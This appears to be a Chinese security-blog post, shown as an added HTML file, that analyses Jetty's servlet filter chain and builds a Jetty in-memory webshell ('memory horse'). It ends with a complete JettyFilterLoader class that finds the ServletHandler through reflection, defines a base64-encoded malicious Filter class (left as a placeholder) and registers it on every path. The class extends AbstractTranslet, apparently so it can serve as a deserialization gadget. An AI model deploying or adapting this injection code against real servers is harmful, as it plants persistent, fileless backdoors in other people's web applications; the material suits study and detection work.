@@ -1,0 +1,363 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="6c73a58e89928e56023637502bc67ce2">Jetty 内存马注入分析</h1>
+<h2 data-content="1" id="4663e84391ca576480150bae78d83ab2">目录</h2>
+<ul>
+<li><a href="#环境搭建" target="_blank">环境搭建</a></li>
+<li><a href="#Filter分析" target="_blank">Filter分析</a></li>
+<li>
+<a href="#构造内存马" target="_blank">构造内存马</a><ul>
+<li><a href="#获取ServletHandler" target="_blank">获取ServletHandler</a></li>
+<li><a href="#获取_filterPathMappings" target="_blank">获取_filterPathMappings</a></li>
+<li><a href="#实例化FilterMapping" target="_blank">实例化FilterMapping</a></li>
+</ul>
+</li>
+<li><a href="#具体实现" target="_blank">具体实现</a></li>
+<li><a href="#后记" target="_blank">后记</a></li>
+</ul>
+<h3 data-content="1" id="e46db8d7a190b89345a9ff3cce42e22c">环境搭建</h3>
+<p>Jetty 是一个开源的servlet容器，它为基于Java的web容器，例如JSP和servlet提供运行环境。Jetty是使用Java语言编写的，它的API以一组JAR包的形式发布。开发人员可以将Jetty容器实例化成一个对象，可以迅速为一些独立运行（stand-alone）的Java应用提供网络和web连接。</p>
+<p>Jetty 9.0.7</p>
+<p>HelloFilter</p>
+<div class="highlight"><pre><span></span>package com.example.JettyDemo;
+
+import javax.servlet.*;
+import javax.servlet.annotation.*;
+import java.io.IOException;
+
+@WebFilter(filterName = "HelloFilter",urlPatterns = "/hello")
+public class HelloFilter implements Filter {
+    public void init(FilterConfig config) throws ServletException {
+    }
+
+    public void destroy() {
+    }
+
+    @Override
+    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {
+        response.getWriter().println("HelloFilter work");
+        chain.doFilter(request, response);
+    }
+}
+</pre></div>
+<h3 data-content="1" id="b850458f33f0e3df0765dac6e54f8ad0">Filter分析</h3>
+<p>在servlet打下断点，查看调用栈，在ServletHandler中第一次出现了和filter相关的信息，可以看出调用栈在经ServletHandler后构造filter相关的信息。个人理解，直接寻找第一出现和filtes相关信息的调用栈，可以快速定位获取上下文的内容。比如这里，就看出我们需要获取ServletHanlder。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230217221441-6b6036b0-aecd-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230217221518-81771d10-aecd-1.png"/></p>
+<p>找到第一次调用<code>doFilter</code>的地方，<code>ServletHandler::doHandle</code>中第一次调用了doFilter，<code>chain.doFilter()</code>。考虑chain是如何生成的。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230217221529-88344f1a-aecd-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230217221542-9022f442-aecd-1.png"/></p>
+<p><code>ServletHandler::doHandle</code>中定义了<code>chain（FilterChain）类型</code>，接着调用了<code>getFilterChain</code>，跟进查看<code>getFilterChain</code>，该函数构造FilterChain。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230217221558-99a0c684-aecd-1.png"/></p>
+<p>在该函数中打下断点，跟进到该函数中，重启服务器。这里实例化了一个filters，接下来的操作就是遍历<code>_filterPathMappings</code>中的元素，从中获取元素中的<code>_Holder</code>（FilterHolder类型）<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230217221612-a213e0ee-aecd-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230217221626-aa3b9df2-aecd-1.png"/></p>
+<p>接着经过<code>new ServletHandler.CacheChain(filers,servletHolder)</code>，会将filters中的信息存入chain，然后返回chain。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230217221655-bb3609f8-aecd-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230217221719-c9cecd60-aecd-1.png"/></p>
+<p>继续往上跟进，观察<code>_filterPathMappings</code>如何生成的。观察调用栈可以发现，在第一次调用<code>ServletHandler</code>的时候，在实例化的<code>ServletHandler</code>对象中有<code>this._filterPathMappings</code>，那么可以理解为获取到<code>ServletHandler对象</code>就能获取到<code>_filterPathMappings</code><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230217221735-d3773f00-aecd-1.png"/></p>
+<p>所以如何将恶意filter注入的关键在于在<code>_filterPathMappings</code>中添加必要的元素。需要往filerPathMappings中添加FilterMapping类型的元素。根据经验，可以假设FilterMapping中需要包含如下三个变量。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230217221758-e0bd493e-aecd-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230217221814-ead68f8e-aecd-1.png"/></p>
+<p>思路如下：</p>
+<div class="highlight"><pre><span></span><span class="mi">1</span><span class="err">、</span><span class="n">获取ServletHandler</span>
+<span class="mi">2</span><span class="err">、</span><span class="n">获取_filterPathMappings</span>
+<span class="mi">3</span><span class="err">、</span><span class="n">往_filterPathMappings中添加元素FilterMapping的实例化对象</span>
+<span class="n">其中该实例化对象包含三个变量</span><span class="err">：</span><span class="n">分别是_filterName</span><span class="o">,</span><span class="n">_holder</span><span class="o">,</span><span class="n">_pathSpecs</span>
+</pre></div>
+<h3 data-content="1" id="c293ca694e2eb323760aaa9f3a011f1b">构造内存马</h3>
+<h4 data-content="1" id="c4b9a77ef37f9619865dbeb08da5a3bd">获取ServletHandler</h4>
+<p>快速定位上下文</p>
+<div class="highlight"><pre><span></span>// 设置搜索类型包含Request关键字的对象
+java.util.List<span class="p">&lt;</span><span class="nt">me.gv7.tools.josearcher.entity.Keyword</span><span class="p">&gt;</span> keys = new ArrayList<span class="p">&lt;</span><span class="nt">Keyword</span><span class="p">&gt;</span>();
+keys.add(new me.gv7.tools.josearcher.entity.Keyword.Builder().setField_type("org.eclipse.jetty.servlet.ServletHandler.").build());
+// 定义黑名单
+java.util.List<span class="p">&lt;</span><span class="nt">me.gv7.tools.josearcher.entity.Blacklist</span><span class="p">&gt;</span> blacklists = new ArrayList<span class="p">&lt;</span><span class="nt">Blacklist</span><span class="p">&gt;</span>();
+blacklists.add(new me.gv7.tools.josearcher.entity.Blacklist.Builder().setField_type("java.io.File").build());
+// 新建一个广度优先搜索Thread.currentThread()的搜索器
+me.gv7.tools.josearcher.searcher.SearchRequstByBFS searcher = new me.gv7.tools.josearcher.searcher.SearchRequstByBFS(Thread.getThreads(),keys);
+// 设置黑名单
+searcher.setBlacklists(blacklists);
+// 打开调试模式,会生成log日志
+searcher.setIs_debug(true);
+// 挖掘深度为20
+searcher.setMax_search_depth(20);
+// 设置报告保存位置
+searcher.setReport_save_path("/Users/lishuheng/Documents/CodeFile/java/MiddleWare/logs/jetty");
+searcher.searchObject();
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230217221856-034a38e0-aece-1.png"/></p>
+<div class="highlight"><pre><span></span>TargetObject = {[Ljava.lang.Thread;} 
+   ---&gt; [8] = {java.lang.Thread} = {java.lang.Thread} 
+    ---&gt; contextClassLoader = {org.eclipse.jetty.webapp.WebAppClassLoader} 
+     ---&gt; _context = {org.eclipse.jetty.webapp.WebAppContext} 
+             ---&gt; _servletHandler = {org.eclipse.jetty.servlet.ServletHandler}
+</pre></div>
+<p>获取_servletHandler</p>
+<div class="highlight"><pre><span></span>Object obj = Thread.currentThread();
+Field field = obj.getClass().getDeclaredField("contextClassLoader");
+field.setAccessible(true);
+obj = field.get(obj);
+
+field = obj.getClass().getDeclaredField("_context");
+field.setAccessible(true);
+obj = field.get(obj);
+
+field = obj.getClass().getSuperclass().getDeclaredField("_servletHandler");
+field.setAccessible(true);
+obj = field.get(obj);
+</pre></div>
+<h4 data-content="1" id="74c773b8e96cc9c9f9062fbe5284c829">获取_filterPathMappings</h4>
+<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kd">static</span> <span class="kd">synchronized</span> <span class="kt">void</span> <span class="nf">InjectFilter</span><span class="o">(){</span>
+    <span class="o">...</span>
+       <span class="c1">//假定已经获取到ServletHandler</span>
+       <span class="n">ArrayList</span> <span class="n">filterPathMappings</span> <span class="o">=</span> <span class="o">(</span><span class="n">ArrayList</span><span class="o">)</span> <span class="n">GetField</span><span class="o">(</span><span class="n">servletHandler</span><span class="o">,</span><span class="s">"_filterPathMappings"</span><span class="o">);</span>
+    <span class="o">...</span>
+    <span class="o">}</span>
+
+
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">synchronized</span> <span class="n">Object</span> <span class="nf">GetField</span><span class="o">(</span><span class="n">Object</span> <span class="n">o</span><span class="o">,</span> <span class="n">String</span> <span class="n">k</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+        <span class="n">Field</span> <span class="n">f</span><span class="o">;</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">f</span> <span class="o">=</span> <span class="n">o</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">k</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NoSuchFieldException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">try</span><span class="o">{</span>
+                <span class="n">f</span> <span class="o">=</span> <span class="n">o</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getSuperclass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">k</span><span class="o">);</span>
+            <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e1</span><span class="o">){</span>
+                <span class="n">f</span> <span class="o">=</span> <span class="n">o</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getSuperclass</span><span class="o">().</span><span class="na">getSuperclass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">k</span><span class="o">);</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+        <span class="n">f</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="k">return</span> <span class="n">f</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">o</span><span class="o">);</span>
+    <span class="o">}</span>
+</pre></div>
+<h4 data-content="1" id="ad5b28f47b7780d5ef2e74f686af92ad">实例化FilterMapping</h4>
+<p>这里需要注意的是，当我企图直接实例化一个FilterMapping的时候，系统报错如下：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230217221918-108365cc-aece-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230217221942-1eb5376a-aece-1.png"/></p>
+<p>但是在Jetty的依赖包中又确实有这个类。暂时存疑。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230217222005-2cdd4bac-aece-1.png"/></p>
+<p>这里提供两种解决思路</p>
+<p><strong>思路一：</strong></p>
+<p>干脆直接用反射的方式去构造FilterMapping，如下：</p>
+<div class="highlight"><pre><span></span><span class="n">Constructor</span> <span class="n">constructor2</span> <span class="o">=</span> <span class="n">servletHandler</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getClassLoader</span><span class="o">().</span><span class="na">loadClass</span><span class="o">(</span><span class="s">"org.eclipse.jetty.servlet.FilterHolder"</span><span class="o">).</span><span class="na">getDeclaredConstructor</span><span class="o">();</span>
+            <span class="n">constructor2</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">Object</span> <span class="n">filterHolder</span> <span class="o">=</span> <span class="n">constructor2</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+
+            <span class="n">Method</span> <span class="n">setFilter</span> <span class="o">=</span> <span class="n">filterHolder</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"setFilter"</span><span class="o">,</span><span class="n">Filter</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+            <span class="n">setFilter</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">filterHolder</span><span class="o">,</span><span class="n">HFilter</span><span class="o">);</span>
+
+            <span class="n">Method</span> <span class="n">setName</span> <span class="o">=</span> <span class="n">filterHolder</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getSuperclass</span><span class="o">().</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"setName"</span><span class="o">,</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+            <span class="n">setName</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">filterHolder</span><span class="o">,</span><span class="n">filterName</span><span class="o">);</span>
+
+            <span class="n">Constructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">servletHandler</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getClassLoader</span><span class="o">().</span><span class="na">loadClass</span><span class="o">(</span><span class="s">"org.eclipse.jetty.servlet.FilterMapping"</span><span class="o">).</span><span class="na">getDeclaredConstructor</span><span class="o">();</span>
+            <span class="n">constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">Object</span> <span class="n">filterMapping</span> <span class="o">=</span> <span class="n">constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+</pre></div>
+<p>实例化FilterMapping对象包含三个变量，分别是<code>_filterName,_holder,_pathSpecs</code>的原因是</p>
+<p><code>_pathSpecs</code>在<code>ServletHandler:getFilterChain()</code>中的<code>appliesTo()</code>函数<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230217222038-403cb3e0-aece-1.png"/></p>
+<p>该函数将实际访问的路由与<code>filterMapping._pathSpecs</code>中所定义的路由进行匹配，匹配正确则为true。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230217222102-4ef7bdb2-aece-1.png"/></p>
+<p>接着调用<code>filterPathMapping.getFilterHolder()</code>，获取<code>filterMapping</code>中的<code>_holder</code>，<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230217222120-592112a2-aece-1.png"/></p>
+<p>FilterHolder中包含了Filter的各项信息。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230217222141-663acf3c-aece-1.png"/></p>
+<p><code>_filterName</code>实际上并非必要，因为通过调试可知，当获取到_holder的值之后，<code>_holder</code>中同样也能获取到<code>_filtername</code>，而且会自动赋值到<code>_filterName</code>中。</p>
+<p>具体代码如下：</p>
+<div class="highlight"><pre><span></span><span class="n">Method</span> <span class="n">setFilterName</span> <span class="o">=</span> <span class="n">filterMapping</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"setFilterName"</span><span class="o">,</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+            <span class="n">setFilterName</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">filterMapping</span><span class="o">,</span><span class="n">filterName</span><span class="o">);</span>
+
+            <span class="n">Method</span> <span class="n">setFilterHolder</span> <span class="o">=</span> <span class="n">filterMapping</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"setFilterHolder"</span><span class="o">,</span><span class="n">filterHolder</span><span class="o">.</span><span class="na">getClass</span><span class="o">());</span>
+            <span class="n">setFilterHolder</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">setFilterHolder</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">filterMapping</span><span class="o">,</span><span class="n">filterHolder</span><span class="o">);</span>
+
+            <span class="n">String</span> <span class="n">pathSpecs</span> <span class="o">=</span> <span class="n">url</span><span class="o">;</span>
+
+            <span class="n">Method</span> <span class="n">setPathSpec</span> <span class="o">=</span> <span class="n">filterMapping</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"setPathSpec"</span><span class="o">,</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+            <span class="n">setPathSpec</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">filterMapping</span><span class="o">,</span><span class="n">pathSpecs</span><span class="o">);</span>
+
+            <span class="n">filterPathMappings</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">filterMapping</span><span class="o">);</span>
+</pre></div>
+<p><strong>思路二：</strong></p>
+<p>在<code>org.eclipse.jetty.servlet.ServletHandler</code>中有方法<code>addFilterWithMapping</code>可以向<code>_filterPathMappings（ArrayList类型）</code>中添加<code>FilterMapping类型的元素</code><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230217222222-7e643378-aece-1.png"/></p>
+<h3 data-content="1" id="1c4dd527245855683a9bc3def50b86a4">具体实现</h3>
+<div class="highlight"><pre><span></span>import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import sun.misc.BASE64Decoder;
+
+import javax.servlet.Filter;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.ArrayList;
+
+
+public class JettyFilterLoader extends AbstractTranslet {
+
+
+    private static Object servletHandler = null;
+    private static String filterName = "HFilter";
+    private static String filterClassName = "com.HFilter";
+    private static String url = "/*";
+
+
+    private static synchronized void LoadFilter() throws Exception {
+        try{
+            Thread.currentThread().getContextClassLoader().loadClass(filterClassName).newInstance();
+        }catch (Exception e){
+            Method a = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
+            a.setAccessible(true);
+            byte[] b = (new BASE64Decoder()).decodeBuffer("恶意Filter.class|base64");
+            a.invoke(Thread.currentThread().getContextClassLoader(), b, 0, b.length);
+        }
+    }
+
+    //获取上下文
+    public static synchronized void GetWebContent() throws Exception {
+        try{
+            Thread currentThread = Thread.currentThread();
+            Object contextClassLoader = GetField(currentThread, "contextClassLoader");
+            Object _context = GetField(contextClassLoader,"_context");
+            servletHandler = GetField(_context,"_servletHandler");
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+
+    private static synchronized void InjectFilter() throws Exception {
+        if(servletHandler != null){
+            //方法一
+            Filter HFilter = (Filter) Thread.currentThread().getContextClassLoader().loadClass(filterClassName).newInstance();
+            ArrayList filterPathMappings = (ArrayList) GetField(servletHandler,"_filterPathMappings");
+
+            Constructor constructor2 = servletHandler.getClass().getClassLoader().loadClass("org.eclipse.jetty.servlet.FilterHolder").getDeclaredConstructor();
+            constructor2.setAccessible(true);
+            Object filterHolder = constructor2.newInstance();
+
+            Method setFilter = filterHolder.getClass().getDeclaredMethod("setFilter",Filter.class);
+            setFilter.invoke(filterHolder,HFilter);
+
+            Method setName = filterHolder.getClass().getSuperclass().getDeclaredMethod("setName",String.class);
+            setName.invoke(filterHolder,filterName);
+
+            Constructor constructor = servletHandler.getClass().getClassLoader().loadClass("org.eclipse.jetty.servlet.FilterMapping").getDeclaredConstructor();
+            constructor.setAccessible(true);
+            Object filterMapping = constructor.newInstance();
+
+            Method setFilterName = filterMapping.getClass().getDeclaredMethod("setFilterName",String.class);
+            setFilterName.invoke(filterMapping,filterName);
+
+            Method setFilterHolder = filterMapping.getClass().getDeclaredMethod("setFilterHolder",filterHolder.getClass());
+            setFilterHolder.setAccessible(true);
+            setFilterHolder.invoke(filterMapping,filterHolder);
+
+            String pathSpecs = url;
+
+            Method setPathSpec = filterMapping.getClass().getDeclaredMethod("setPathSpec",String.class);
+            setPathSpec.invoke(filterMapping,pathSpecs);
+
+            filterPathMappings.add(filterMapping);
+            System.out.println("123");
+
+            /*           
+            //方法二
+            Class HFilter = Thread.currentThread().getContextClassLoader().loadClass(filterClassName);
+            Method addFilterWithMapping = GetMethod(servletHandler, "addFilterWithMapping", Class.class, String.class, Integer.TYPE);
+            addFilterWithMapping.invoke(servletHandler, HFilter, "/*", 1);
+
+            //使用addFilterWithMapping有个问题，动态添加FilterMapping时，其dispatches可能会与已加载到内存中的FilterMapping重复了，因此需要调整元素在_filterPathMappings中的位置
+            Object filterMaps = GetField(servletHandler, "_filterMappings");
+            Object[] tmpFilterMaps = new Object[Array.getLength(filterMaps)];
+            int n = 1;
+            int j;
+
+            for(j = 0; j <span class="p">&lt;</span> <span class="nt">Array.getLength</span><span class="err">(</span><span class="na">filterMaps</span><span class="err">);</span> <span class="err">++</span><span class="na">j</span><span class="err">)</span> <span class="err">{</span>
+                <span class="na">Object</span> <span class="na">filter </span><span class="o">=</span> <span class="s">Array.get(filterMaps,</span> <span class="na">j</span><span class="err">);</span>
+                <span class="na">String</span> <span class="na">filterName </span><span class="o">=</span> <span class="s">(String)GetField(filter,</span> <span class="err">"</span><span class="na">_filterName</span><span class="err">");</span>
+                <span class="na">if</span> <span class="err">(</span><span class="na">filterName</span><span class="err">.</span><span class="na">contains</span><span class="err">(</span><span class="na">HFilter</span><span class="err">.</span><span class="na">getName</span><span class="err">()))</span> <span class="err">{</span>
+                    <span class="na">tmpFilterMaps</span><span class="err">[</span><span class="na">0</span><span class="err">]</span> <span class="err">=</span> <span class="na">filter</span><span class="err">;</span>
+                <span class="err">}</span> <span class="na">else</span> <span class="err">{</span>
+                    <span class="na">tmpFilterMaps</span><span class="err">[</span><span class="na">n</span><span class="err">]</span> <span class="err">=</span> <span class="na">filter</span><span class="err">;</span>
+                    <span class="err">++</span><span class="na">n</span><span class="err">;</span>
+                <span class="err">}</span>
+            <span class="err">}</span>
+            <span class="na">for</span><span class="err">(</span><span class="na">j </span><span class="o">=</span> <span class="s">0;</span> <span class="na">j</span> <span class="err">&lt;</span> <span class="na">tmpFilterMaps</span><span class="err">.</span><span class="na">length</span><span class="err">;</span> <span class="err">++</span><span class="na">j</span><span class="err">)</span> <span class="err">{</span>
+                <span class="na">Array</span><span class="err">.</span><span class="na">set</span><span class="err">(</span><span class="na">filterMaps</span><span class="err">,</span> <span class="na">j</span><span class="err">,</span> <span class="na">tmpFilterMaps</span><span class="err">[</span><span class="na">j</span><span class="err">]);</span>
+            <span class="err">}*/</span>
+        <span class="err">}</span>
+
+    <span class="err">}</span>
+
+    <span class="na">private</span> <span class="na">static</span> <span class="na">synchronized</span> <span class="na">Object</span> <span class="na">GetField</span><span class="err">(</span><span class="na">Object</span> <span class="na">o</span><span class="err">,</span> <span class="na">String</span> <span class="na">k</span><span class="err">)</span> <span class="na">throws</span> <span class="na">Exception</span><span class="err">{</span>
+        <span class="na">Field</span> <span class="na">f</span><span class="err">;</span>
+        <span class="na">try</span> <span class="err">{</span>
+            <span class="na">f </span><span class="o">=</span> <span class="s">o.getClass().getDeclaredField(k);</span>
+        <span class="err">}</span> <span class="na">catch</span> <span class="err">(</span><span class="na">NoSuchFieldException</span> <span class="na">e</span><span class="err">)</span> <span class="err">{</span>
+            <span class="na">try</span><span class="err">{</span>
+                <span class="na">f </span><span class="o">=</span> <span class="s">o.getClass().getSuperclass().getDeclaredField(k);</span>
+            <span class="err">}</span><span class="na">catch</span> <span class="err">(</span><span class="na">Exception</span> <span class="na">e1</span><span class="err">){</span>
+                <span class="na">f </span><span class="o">=</span> <span class="s">o.getClass().getSuperclass().getSuperclass().getDeclaredField(k);</span>
+            <span class="err">}</span>
+        <span class="err">}</span>
+        <span class="na">f</span><span class="err">.</span><span class="na">setAccessible</span><span class="err">(</span><span class="na">true</span><span class="err">);</span>
+        <span class="na">return</span> <span class="na">f</span><span class="err">.</span><span class="na">get</span><span class="err">(</span><span class="na">o</span><span class="err">);</span>
+    <span class="err">}</span>
+
+    <span class="na">private</span> <span class="na">static</span> <span class="na">synchronized</span> <span class="na">Method</span> <span class="na">GetMethod</span><span class="err">(</span><span class="na">Object</span> <span class="na">obj</span><span class="err">,</span> <span class="na">String</span> <span class="na">methodName</span><span class="err">,</span> <span class="na">Class</span><span class="err">&lt;?</span><span class="p">&gt;</span>... paramClazz) throws NoSuchMethodException {
+        Method method = null;
+        Class clazz = obj.getClass();
+
+        while(clazz != Object.class) {
+            try {
+                method = clazz.getDeclaredMethod(methodName, paramClazz);
+                break;
+            } catch (NoSuchMethodException var6) {
+                clazz = clazz.getSuperclass();
+            }
+        }
+
+        if (method == null) {
+            throw new NoSuchMethodException(methodName);
+        } else {
+            method.setAccessible(true);
+            return method;
+        }
+    }
+
+
+    static {
+        new JettyFilterLoader();
+    }
+
+    public JettyFilterLoader(){
+        try{
+            LoadFilter();
+            GetWebContent();
+            InjectFilter();
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+}
+</pre></div>
+<h3 data-content="1" id="dc8b50a2598d892df04cd37c22a340e9">后记</h3>
+<p>为什么实例化FilterMapping时会存在找不到该类的问题，望赐教。如有分析不对的地方，望斧正。</p>
+</div>
+</div>
